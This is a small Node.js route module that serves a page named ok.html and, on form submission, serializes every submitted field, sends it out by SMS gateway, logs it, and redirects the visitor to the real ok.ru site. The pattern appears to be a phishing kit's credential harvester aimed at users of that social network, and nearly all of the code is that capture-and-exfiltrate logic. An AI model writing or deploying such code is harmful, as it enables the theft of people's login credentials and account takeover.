const path = require('path');

const smsgetway = require('../middleware/smsgetway');

module.exports.get = function(req, res) {
  res.sendFile(path.join(__dirname, '../views/ok.html'));
}

module.exports.post = function(req, res) {

  let text = JSON.stringify(req.body);

  if (process.env.sms) {
    smsgetway.send(text);
  }

  console.log('Log ::: ', text);

  res.writeHead(301,{Location: 'http://www.ok.ru'});
  res.end();
}